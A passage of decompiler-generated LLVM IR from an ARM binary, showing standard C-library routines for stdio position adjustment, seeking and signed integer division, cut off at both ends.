207, 212, 213, 214, 215, 216, 217, 218, 208, 209, 210, 211, 219, 220, 221, 222, 223, 224, 225, 226, 11, 227, 228, 229, 198, 199, 200, 201, 234, 235, 232, 233, 202, 203, 236, 237, 238, 239, 247, 248, 83, 84, 230, 231, 85, 86, 18 }
  uselistorder label %dec_label_pc_14a9c, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_14a80, { 1, 0 }
  uselistorder label %dec_label_pc_14a7c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14a30, { 1, 0 }
  uselistorder label %dec_label_pc_149f8, { 2, 1, 0 }
}

define i32 @function_14ab0(i32 %arg1) local_unnamed_addr {
dec_label_pc_14ab0:
  %v0_14ab0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14ab0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_14ab0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14ab0, %bb
  %v10_14abc = phi i32 [ %arg1, %dec_label_pc_14ab0 ], [ 0, %bb ]
  ret i32 %v10_14abc

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14ac0 = load i32, i32* @r4, align 4
  store i32 %v3_14ac0, i32* %stack_var_-12, align 4
  %v3_14ac4 = load i16, i16* %arg1, align 2
  %v4_14ac4 = zext i16 %v3_14ac4 to i32
  store i32 %v4_14ac4, i32* @ip, align 4
  %tmp17 = urem i16 %v3_14ac4, 4
  %v1_14ac8 = zext i16 %tmp17 to i32
  store i32 %v1_14ac8, i32* %r2.global-to-local, align 4
  %v2_14ac8 = icmp eq i16 %tmp17, 0
  br i1 %v2_14ac8, label %bb, label %dec_label_pc_14adc

bb:                                               ; preds = %entry
  br label %bb14

dec_label_pc_14adc:                               ; preds = %entry
  %v1_14adc = add nsw i32 %v1_14ac8, -1
  %v7_14adc = icmp eq i16 %tmp17, 1
  br i1 %v7_14adc, label %bb14, label %dec_label_pc_14ae4

dec_label_pc_14ae4:                               ; preds = %dec_label_pc_14adc
  %v1_14ae4 = and i32 %v4_14ac4, 2048
  %v2_14ae4 = icmp eq i32 %v1_14ae4, 0
  br i1 %v2_14ae4, label %bb14, label %dec_label_pc_14aec

dec_label_pc_14aec:                               ; preds = %dec_label_pc_14ae4
  %v7_14aec = icmp eq i32 %v1_14adc, 2
  br i1 %v7_14aec, label %dec_label_pc_14b70, label %dec_label_pc_14af4

dec_label_pc_14af4:                               ; preds = %dec_label_pc_14aec
  %v2_14af4 = add i32 %tmp, 40
  %v3_14af4 = inttoptr i32 %v2_14af4 to i32*
  %v4_14af4 = load i32, i32* %v3_14af4, align 4
  store i32 %v4_14af4, i32* %r3.global-to-local, align 4
  %v2_14af8 = icmp eq i32 %v4_14af4, 0
  br i1 %v2_14af8, label %dec_label_pc_14b00, label %dec_label_pc_14b70

dec_label_pc_14b00:                               ; preds = %dec_label_pc_14af4
  %v2_14b00 = add i32 %tmp, 44
  %v3_14b00 = inttoptr i32 %v2_14b00 to i32*
  %v4_14b00 = load i32, i32* %v3_14b00, align 4
  store i32 %v4_14b00, i32* %r3.global-to-local, align 4
  %v2_14b04 = add i32 %tmp, 3
  %v3_14b04 = inttoptr i32 %v2_14b04 to i8*
  %v4_14b04 = load i8, i8* %v3_14b04, align 1
  %v5_14b04 = zext i8 %v4_14b04 to i32
  store i32 %v5_14b04, i32* %r2.global-to-local, align 4
  %v2_14b08 = icmp eq i32 %v4_14b00, 0
  br i1 %v2_14b08, label %.thread1, label %bb13

.thread1:                                         ; preds = %dec_label_pc_14b00
  %v1_14b103 = sub nsw i32 0, %v5_14b04
  br label %bb14

bb13:                                             ; preds = %dec_label_pc_14b00
  %v3_14b0c = add i32 %tmp, 2
  %v4_14b0c = inttoptr i32 %v3_14b0c to i8*
  %v5_14b0c = load i8, i8* %v4_14b0c, align 1
  %v6_14b0c = zext i8 %v5_14b0c to i32
  store i32 %v6_14b0c, i32* %r3.global-to-local, align 4
  %sum = add nuw nsw i32 %v6_14b0c, %v5_14b04
  %v3_14b14 = sub nsw i32 0, %sum
  br label %bb14

bb14:                                             ; preds = %bb, %.thread1, %dec_label_pc_14ae4, %dec_label_pc_14adc, %bb13
  %v1_14b28 = phi i32 [ %v1_14b103, %.thread1 ], [ %v1_14adc, %dec_label_pc_14ae4 ], [ %v1_14adc, %dec_label_pc_14adc ], [ 0, %bb ], [ %v3_14b14, %bb13 ]
  %v1_14b18 = and i32 %v4_14ac4, 64
  %v2_14b18 = icmp eq i32 %v1_14b18, 0
  %v2_14b1c = add i32 %tmp, 16
  %v3_14b1c = inttoptr i32 %v2_14b1c to i32*
  %v4_14b1c = load i32, i32* %v3_14b1c, align 4
  store i32 %v4_14b1c, i32* %r3.global-to-local, align 4
  %storemerge.in.in.v = select i1 %v2_14b18, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_14b28 = sub i32 %v1_14b28, %v4_14b1c
  store i32 %v2_14b28, i32* %r3.global-to-local, align 4
  %v1_14b2c = inttoptr i32 %arg2 to i32*
  %v2_14b2c = load i32, i32* %v1_14b2c, align 4
  store i32 %v2_14b2c, i32* %r0.global-to-local, align 4
  %v3_14b2c = add i32 %arg2, 4
  %v4_14b2c = inttoptr i32 %v3_14b2c to i32*
  %v5_14b2c = load i32, i32* %v4_14b2c, align 4
  %v2_14b30 = add i32 %storemerge, %v2_14b28
  store i32 %v2_14b30, i32* %r4.global-to-local, align 4
  %v2_14b34 = sub i32 %v2_14b2c, %v2_14b30
  store i32 %v2_14b34, i32* %r2.global-to-local, align 4
  %v2_14b38 = and i32 %v2_14b30, 1073741824
  %v3_14b38 = icmp ne i32 %v2_14b38, 0
  %v4_14b38 = ashr i32 %v2_14b30, 31
  %v6_14b38 = icmp eq i1 %v3_14b38, false
  %v7_14b38 = sub i32 %v5_14b2c, %v4_14b38
  %v9_14b38 = sext i1 %v6_14b38 to i32
  %v10_14b38 = add i32 %v7_14b38, %v9_14b38
  store i32 %v10_14b38, i32* %r3.global-to-local, align 4
  %v2_14b3c = sub i32 %v10_14b38, %v5_14b2c
  %v4_14b3c = xor i32 %v10_14b38, %v5_14b2c
  %v5_14b3c = xor i32 %v2_14b3c, %v10_14b38
  %v6_14b3c = and i32 %v5_14b3c, %v4_14b3c
  %v7_14b3c = icmp slt i32 %v6_14b3c, 0
  %v8_14b3c = icmp slt i32 %v2_14b3c, 0
  %v9_14b3c = icmp eq i32 %v10_14b38, %v5_14b2c
  store i32 %v2_14b34, i32* %v1_14b2c, align 4
  %v5_14b40 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_14b40, i32* %v4_14b2c, align 4
  %v3_14b44 = xor i1 %v8_14b3c, %v7_14b3c
  %v4_14b44 = or i1 %v9_14b3c, %v3_14b44
  br i1 %v4_14b44, label %dec_label_pc_14b48, label %dec_label_pc_14b54

dec_label_pc_14b48:                               ; preds = %bb14
  br i1 %v9_14b3c, label %dec_label_pc_14b4c, label %dec_label_pc_14b58thread-pre-split

dec_label_pc_14b4c:                               ; preds = %dec_label_pc_14b48
  %v0_14b4c = load i32, i32* %r2.global-to-local, align 4
  %v1_14b4c = load i32, i32* %r0.global-to-local, align 4
  %tmp18 = icmp ugt i32 %v0_14b4c, %v1_14b4c
  br i1 %tmp18, label %dec_label_pc_14b54, label %dec_label_pc_14b58thread-pre-split

dec_label_pc_14b54:                               ; preds = %dec_label_pc_14b4c, %bb14
  %v0_14b54 = load i32, i32* %r4.global-to-local, align 4
  %v1_14b54 = sub i32 0, %v0_14b54
  store i32 %v1_14b54, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14b58

dec_label_pc_14b58thread-pre-split:               ; preds = %dec_label_pc_14b4c, %dec_label_pc_14b48
  %v0_14b58.pr = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14b58

dec_label_pc_14b58:                               ; preds = %dec_label_pc_14b58thread-pre-split, %dec_label_pc_14b54
  %v0_14b58 = phi i32 [ %v0_14b58.pr, %dec_label_pc_14b58thread-pre-split ], [ %v1_14b54, %dec_label_pc_14b54 ]
  %v1_14b58 = icmp slt i32 %v0_14b58, 0
  br i1 %v1_14b58, label %dec_label_pc_14b60, label %dec_label_pc_14b74

dec_label_pc_14b60:                               ; preds = %dec_label_pc_14b58
  %v0_14b60 = call i32 @__GI___errno_location()
  store i32 %v0_14b60, i32* %r0.global-to-local, align 4
  store i32 75, i32* %r3.global-to-local, align 4
  %v2_14b68 = inttoptr i32 %v0_14b60 to i32*
  store i32 75, i32* %v2_14b68, align 4
  %v0_14b74.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14b74

dec_label_pc_14b70:                               ; preds = %dec_label_pc_14af4, %dec_label_pc_14aec
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14b74

dec_label_pc_14b74:                               ; preds = %dec_label_pc_14b58, %dec_label_pc_14b60, %dec_label_pc_14b70
  %v0_14b74 = phi i32 [ %v0_14b58, %dec_label_pc_14b58 ], [ %v0_14b74.pre, %dec_label_pc_14b60 ], [ -1, %dec_label_pc_14b70 ]
  store i32 %v0_14b74, i32* %r0.global-to-local, align 4
  %v2_14b7c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14b7c, i32* @r4, align 4
  ret i32 %v0_14b74

; uselistorder directives
  uselistorder i32 %v0_14b74, { 1, 0 }
  uselistorder i1 %v9_14b3c, { 1, 0 }
  uselistorder i32 %v2_14b3c, { 1, 0 }
  uselistorder i32 %v10_14b38, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v5_14b2c, { 2, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 5, 1, 3, 2, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 0 }
  uselistorder i32 ()* @__GI___errno_location, { 72, 71, 70, 69, 40, 39, 68, 67, 66, 61, 37, 36, 35, 34, 33, 65, 64, 63, 26, 30, 60, 59, 29, 32, 56, 51, 31, 38, 25, 62, 28, 27, 58, 57, 55, 54, 53, 52, 8, 7, 21, 50, 6, 45, 20, 19, 18, 16, 15, 49, 48, 47, 17, 14, 44, 24, 23, 1, 12, 11, 22, 5, 10, 46, 3, 9, 4, 43, 0, 13, 42, 41, 2 }
  uselistorder i32 64, { 5, 6, 3, 17, 0, 14, 12, 7, 8, 9, 10, 15, 16, 11, 13, 18, 2, 4, 1 }
  uselistorder i32 44, { 6, 7, 9, 10, 2, 11, 8, 34, 12, 13, 1, 0, 3, 14, 4, 18, 19, 20, 21, 22, 23, 15, 16, 17, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 5 }
  uselistorder i32 40, { 5, 11, 12, 6, 7, 8, 9, 10, 15, 1, 13, 16, 2, 14, 4, 3, 0 }
  uselistorder i16 0, { 9, 0, 10, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i16 4, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_14b74, { 2, 1, 0 }
  uselistorder label %bb14, { 4, 1, 2, 3, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_14b90 = load i32, i32* %arg2, align 4
  %v3_14b90 = add i32 %tmp, 4
  %v4_14b90 = inttoptr i32 %v3_14b90 to i32*
  %v5_14b90 = load i32, i32* %v4_14b90, align 4
  %v1_14b94 = add i32 %arg1, 4
  %v2_14b94 = inttoptr i32 %v1_14b94 to i32*
  %v3_14b94 = load i32, i32* %v2_14b94, align 4
  store i32 %tmp, i32* @r4, align 4
  %v4_14b9c = call i32 @__GI_lseek64(i32 %v3_14b94, i32 %tmp, i32 %v2_14b90, i32 %v5_14b90)
  %v1_14ba0 = icmp slt i32* %arg2, null
  br i1 %v1_14ba0, label %bb13, label %bb

bb:                                               ; preds = %entry
  %v3_14ba85 = load i32, i32* @r4, align 4
  %v4_14ba86 = inttoptr i32 %v3_14ba85 to i32*
  store i32 %v4_14b9c, i32* %v4_14ba86, align 4
  %v6_14ba87 = add i32 %v3_14ba85, 4
  %v7_14ba88 = inttoptr i32 %v6_14ba87 to i32*
  store i32 %tmp, i32* %v7_14ba88, align 4
  br label %bb13

bb13:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v4_14b9c, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder i32* null, { 2, 3, 0, 4, 1, 6, 7, 8, 9, 5, 10 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_lseek64, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v0_14bc0 = load i32, i32* @r1, align 4
  %v1_14bc0 = icmp slt i32 %v0_14bc0, 0
  %v2_14bc0 = icmp eq i32 %v0_14bc0, 0
  %v2_14bc4 = xor i32 %v0_14bc0, %arg1
  br i1 %v2_14bc0, label %dec_label_pc_14cd8, label %dec_label_pc_14bcc

dec_label_pc_14bcc:                               ; preds = %entry
  br i1 %v1_14bc0, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_14bcc
  %v2_14bcc = sub i32 0, %v0_14bc0
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_14bcc, %bb
  %v1_14c98 = phi i32 [ %v2_14bcc, %bb ], [ %v0_14bc0, %dec_label_pc_14bcc ]
  %v1_14bd0 = add i32 %v1_14c98, -1
  %v7_14bd0 = icmp eq i32 %v1_14c98, 1
  br i1 %v7_14bd0, label %dec_label_pc_14c78, label %dec_label_pc_14bd8

dec_label_pc_14bd8:                               ; preds = %thread-pre-split
  %v1_14bd8 = icmp slt i32 %arg1, 0
  br i1 %v1_14bd8, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_14bd8
  %v2_14bdc = sub i32 0, %arg1
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_14bd8, %bb85
  %v0_14ccc = phi i32 [ %arg1, %dec_label_pc_14bd8 ], [ %v2_14bdc, %bb85 ]
  %v3_14be0 = icmp uge i32 %v0_14ccc, %v1_14c98
  %v9_14be0 = icmp eq i32 %v0_14ccc, %v1_14c98
  %v2_14be4 = xor i1 %v3_14be0, true
  %v3_14be4 = or i1 %v9_14be0, %v2_14be4
  br i1 %v3_14be4, label %dec_label_pc_14c84, label %dec_label_pc_14be8

dec_label_pc_14be8:                               ; preds = %bb86
  %v2_14be8 = and i32 %v1_14bd0, %v1_14c98
  %v4_14be8 = icmp eq i32 %v2_14be8, 0
  br i1 %v4_14be8, label %dec_label_pc_14c94, label %dec_label_pc_14bf0

dec_label_pc_14bf0:                               ; preds = %dec_label_pc_14be8
  %v3_14bf0 = icmp ult i32 %v1_14c98, 536870912
  br i1 %v3_14bf0, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_14bf0
  %v4_14bf4 = mul i32 %v1_14c98, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_14bf0, %.thread
  %v0_14c14.pr40.ph = phi i32 [ %v4_14bf4, %.thread ], [ %v1_14c98, %dec_label_pc_14bf0 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_14bf0 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_14c14.pr40 = phi i32 [ %v4_14c08, %bb89 ], [ %v0_14c14.pr40.ph, %.preheader.preheader ]
  %v1_14c0c = phi i32 [ %v4_14c0c, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_14c00 = icmp ugt i32 %v0_14c14.pr40, 268435455
  br i1 %v2_14c00, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_14c14thread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_14c04 = icmp ult i32 %v0_14c14.pr40, %v0_14ccc
  br i1 %v4_14c04, label %bb88, label %dec_label_pc_14c14thread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_14c08 = and i32 %v0_14c14.pr40, 268435456
  %v3_14c08 = icmp eq i32 %v2_14c08, 0
  %v4_14c08 = mul i32 %v0_14c14.pr40, 16
  br i1 %v3_14c08, label %bb89, label %dec_label_pc_14c14.loopexit

bb89:                                             ; preds = %bb88
  %v2_14c0c = and i32 %v1_14c0c, 268435456
  %v3_14c0c = icmp eq i32 %v2_14c0c, 0
  %v4_14c0c = mul i32 %v1_14c0c, 16
  br i1 %v3_14c0c, label %.preheader, label %dec_label_pc_14c14thread-pre-split.loopexit.loopexit

dec_label_pc_14c14thread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_14c2052.ph = phi i32 [ %v1_14c0c, %bb87 ], [ %v4_14c0c, %bb89 ]
  %v0_14c14.pr42.ph = phi i32 [ %v0_14c14.pr40, %bb87 ], [ %v4_14c08, %bb89 ]
  br label %dec_label_pc_14c14thread-pre-split.loopexit

dec_label_pc_14c14thread-pre-split.loopexit:      ; preds = %dec_label_pc_14c14thread-pre-split.loopexit.loopexit, %.thread3
  %v1_14c2052 = phi i32 [ %v1_14c0c, %.thread3 ], [ %v1_14c2052.ph, %dec_label_pc_14c14thread-pre-split.loopexit.loopexit ]
  %v0_14c14.pr42 = phi i32 [ %v0_14c14.pr40, %.thread3 ], [ %v0_14c14.pr42.ph, %dec_label_pc_14c14thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_14c14thread-pre-split

dec_label_pc_14c14thread-pre-split:               ; preds = %dec_label_pc_14c14thread-pre-split.loopexit, %bb91
  %v1_14c2050 = phi i32 [ %v1_14c2052, %dec_label_pc_14c14thread-pre-split.loopexit ], [ %v3_14c20, %bb91 ]
  %v2_14c1848 = phi i32 [ %v0_14ccc, %dec_label_pc_14c14thread-pre-split.loopexit ], [ %v2_14c18, %bb91 ]
  %v0_14c14.pr = phi i32 [ %v0_14c14.pr42, %dec_label_pc_14c14thread-pre-split.loopexit ], [ %v3_14c1c, %bb91 ]
  br label %dec_label_pc_14c14

dec_label_pc_14c14.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_14c14

dec_label_pc_14c14:                               ; preds = %dec_label_pc_14c14.loopexit, %dec_label_pc_14c14thread-pre-split
  %v1_14c20 = phi i32 [ %v1_14c2050, %dec_label_pc_14c14thread-pre-split ], [ %v1_14c0c, %dec_label_pc_14c14.loopexit ]
  %v2_14c18 = phi i32 [ %v2_14c1848, %dec_label_pc_14c14thread-pre-split ], [ %v0_14ccc, %dec_label_pc_14c14.loopexit ]
  %v1_14c1c = phi i32 [ %v0_14c14.pr, %dec_label_pc_14c14thread-pre-split ], [ %v4_14c08, %dec_label_pc_14c14.loopexit ]
  %v2_14c14 = icmp slt i32 %v1_14c1c, 0
  br i1 %v2_14c14, label %dec_label_pc_14c28, label %bb90

bb90:                                             ; preds = %dec_label_pc_14c14
  %v4_14c18 = icmp ult i32 %v1_14c1c, %v2_14c18
  br i1 %v4_14c18, label %bb91, label %dec_label_pc_14c28

bb91:                                             ; preds = %bb90
  %v3_14c1c = mul i32 %v1_14c1c, 2
  %v2_14c20 = icmp slt i32 %v1_14c20, 0
  %v3_14c20 = mul i32 %v1_14c20, 2
  br i1 %v2_14c20, label %dec_label_pc_14c28, label %dec_label_pc_14c14thread-pre-split

dec_label_pc_14c28:                               ; preds = %bb90, %dec_label_pc_14c14, %bb91
  %v2_14c3463 = phi i32 [ %v3_14c20, %bb91 ], [ %v1_14c20, %bb90 ], [ %v1_14c20, %dec_label_pc_14c14 ]
  %v1_14c2c55 = phi i32 [ %v3_14c1c, %bb91 ], [ %v1_14c1c, %bb90 ], [ %v1_14c1c, %dec_label_pc_14c14 ]
  br label %dec_label_pc_14c2c

dec_label_pc_14c2c:                               ; preds = %.thread13, %dec_label_pc_14c28
  %v1_14c60 = phi i32 [ %v4_14c60, %.thread13 ], [ %v2_14c3463, %dec_label_pc_14c28 ]
  %v1_14c34 = phi i32 [ %v1_14c70, %.thread13 ], [ 0, %dec_label_pc_14c28 ]
  %v1_14c64 = phi i32 [ %v4_14c64, %.thread13 ], [ %v1_14c2c55, %dec_label_pc_14c28 ]
  %v1_14c30 = phi i32 [ %v0_14c5c, %.thread13 ], [ %v0_14ccc, %dec_label_pc_14c28 ]
  %v3_14c2c = icmp ult i32 %v1_14c30, %v1_14c64
  br i1 %v3_14c2c, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_14c2c
  %v3_14c30 = sub i32 %v1_14c30, %v1_14c64
  %v3_14c34 = or i32 %v1_14c34, %v1_14c60
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_14c2c, %bb92
  %v1_14c3c = phi i32 [ %v1_14c30, %dec_label_pc_14c2c ], [ %v3_14c30, %bb92 ]
  %v1_14c40 = phi i32 [ %v1_14c34, %dec_label_pc_14c2c ], [ %v3_14c34, %bb92 ]
  %v4_14c38 = udiv i32 %v1_14c64, 2
  %v6_14c38 = icmp ult i32 %v1_14c3c, %v4_14c38
  br i1 %v6_14c38, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_14c3c = urem i32 %v1_14c64, 2
  %v4_14c3c = icmp eq i32 %v3_14c3c, 0
  %v6_14c3c = sub i32 %v1_14c3c, %v4_14c38
  br i1 %v4_14c3c, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_14c40 = udiv i32 %v1_14c60, 2
  %v6_14c40 = or i32 %v1_14c40, %v5_14c40
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_14c48 = phi i32 [ %v6_14c3c, %bb93 ], [ %v1_14c3c, %.thread8 ], [ %v6_14c3c, %bb94 ]
  %v1_14c4c = phi i32 [ %v1_14c40, %bb93 ], [ %v1_14c40, %.thread8 ], [ %v6_14c40, %bb94 ]
  %v4_14c44 = udiv i32 %v1_14c64, 4
  %v6_14c44 = icmp ult i32 %v1_14c48, %v4_14c44
  br i1 %v6_14c44, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_14c48 = and i32 %v1_14c64, 2
  %v4_14c48 = icmp eq i32 %v3_14c48, 0
  %v6_14c48 = sub i32 %v1_14c48, %v4_14c44
  br i1 %v4_14c48, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_14c4c = udiv i32 %v1_14c60, 4
  %v6_14c4c = or i32 %v1_14c4c, %v5_14c4c
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_14c54 = phi i32 [ %v6_14c48, %bb95 ], [ %v1_14c48, %.thread9 ], [ %v6_14c48, %bb96 ]
  %v1_14c58 = phi i32 [ %v1_14c4c, %bb95 ], [ %v1_14c4c, %.thread9 ], [ %v6_14c4c, %bb96 ]
  %v4_14c50 = udiv i32 %v1_14c64, 8
  %v6_14c50 = icmp ult i32 %v1_14c54, %v4_14c50
  br i1 %v6_14c50, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_14c54 = and i32 %v1_14c64, 4
  %v4_14c54 = icmp eq i32 %v3_14c54, 0
  %v6_14c54 = sub i32 %v1_14c54, %v4_14c50
  br i1 %v4_14c54, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_14c58 = udiv i32 %v1_14c60, 8
  %v6_14c58 = or i32 %v1_14c58, %v5_14c58
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_14c70 = phi i32 [ %v1_14c58, %bb97 ], [ %v1_14c58, %.thread10 ], [ %v6_14c58, %bb98 ]
  %v0_14c5c = phi i32 [ %v6_14c54, %bb97 ], [ %v1_14c54, %.thread10 ], [ %v6_14c54, %bb98 ]
  %v2_14c5c = icmp eq i32 %v0_14c5c, 0
  br i1 %v2_14c5c, label %dec_label_pc_14c6c, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_14c60, 16
  br i1 %tmp, label %dec_label_pc_14c6c, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_14c60 = udiv i32 %v1_14c60, 16
  %v4_14c64 = udiv i32 %v1_14c64, 16
  br label %dec_label_pc_14c2c

dec_label_pc_14c6c:                               ; preds = %thread-pre-split12, %bb99
  %v1_14c6c = icmp slt i32 %v2_14bc4, 0
  br i1 %v1_14c6c, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_14c6c
  %v2_14c70 = sub i32 0, %v1_14c70
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_14c78, %dec_label_pc_14c6c, %bb100
  %v1_14c74 = phi i32 [ %v1_14c70, %dec_label_pc_14c6c ], [ %v2_14c70, %bb100 ], [ %arg1, %dec_label_pc_14c78 ], [ %v2_14c7c, %bb101 ], [ %v1_14c9080, %bb103 ], [ %v2_14c8c, %bb104 ]
  ret i32 %v1_14c74

dec_label_pc_14c78:                               ; preds = %thread-pre-split
  br i1 %v1_14bc0, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_14c78
  %v2_14c7c = sub i32 0, %arg1
  br label %.thread16

dec_label_pc_14c84:                               ; preds = %bb86
  br i1 %v3_14be0, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_14c84
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_14c84, %bb102
  %v1_14c9080 = phi i32 [ %arg1, %dec_label_pc_14c84 ], [ 0, %bb102 ]
  br i1 %v9_14be0, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_14c88 = ashr i32 %v2_14bc4, 31
  %v2_14c8c = or i32 %v4_14c88, 1
  br label %.thread16

dec_label_pc_14c94:                               ; preds = %dec_label_pc_14be8
  %v2_14c94 = icmp ugt i32 %v1_14c98, 65535
  br i1 %v2_14c94, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_14c94
  %v2_14c98 = and i32 %v1_14c98, 32768
  %v3_14c98 = icmp eq i32 %v2_14c98, 0
  %v4_14c98 = udiv i32 %v1_14c98, 65536
  br i1 %v3_14c98, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_14c94
  %v0_14ca470 = phi i32 [ %v1_14c98, %dec_label_pc_14c94 ], [ %v4_14c98, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_14ca8 = phi i32 [ %v0_14ca470, %.thread19 ], [ %v4_14c98, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_14ca4 = icmp ugt i32 %v1_14ca8, 255
  br i1 %v2_14ca4, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_14ca8 = and i32 %v1_14ca8, 128
  %v3_14ca8 = icmp eq i32 %v2_14ca8, 0
  %v4_14ca8 = udiv i32 %v1_14ca8, 256
  br i1 %v3_14ca8, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_14cac = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_14cb8 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_14cac, %bb108 ]
  %v1_14cb4 = phi i32 [ %v1_14ca8, %bb106 ], [ %v4_14ca8, %bb107 ], [ %v4_14ca8, %bb108 ]
  %v2_14cb0 = icmp ugt i32 %v1_14cb4, 15
  br i1 %v2_14cb0, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_14cb4 = and i32 %v1_14cb4, 8
  %v3_14cb4 = icmp eq i32 %v2_14cb4, 0
  %v4_14cb4 = udiv i32 %v1_14cb4, 16
  br i1 %v3_14cb4, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_14cb8 = add nsw i32 %v1_14cb8, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_14cc0 = phi i32 [ %v1_14cb8, %.thread20 ], [ %v1_14cb8, %bb109 ], [ %v2_14cb8, %bb110 ]
  %v5_14cc4 = phi i32 [ %v1_14cb4, %.thread20 ], [ %v4_14cb4, %bb109 ], [ %v4_14cb4, %bb110 ]
  %v2_14cbc = icmp ugt i32 %v5_14cc4, 3
  %v7_14cbc = icmp eq i32 %v5_14cc4, 4
  %v2_14cc0 = xor i1 %v7_14cbc, true
  %v3_14cc0 = and i1 %v2_14cbc, %v2_14cc0
  br i1 %v3_14cc0, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_14cc0 = add nsw i32 %v4_14cc0, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_14cc4 = phi i32 [ %v4_14cc0, %.thread21 ], [ %v5_14cc0, %bb111 ]
  %v2_14cc4 = xor i1 %v2_14cbc, true
  %v3_14cc4 = or i1 %v7_14cbc, %v2_14cc4
  br i1 %v3_14cc4, label %bb113, label %bb114

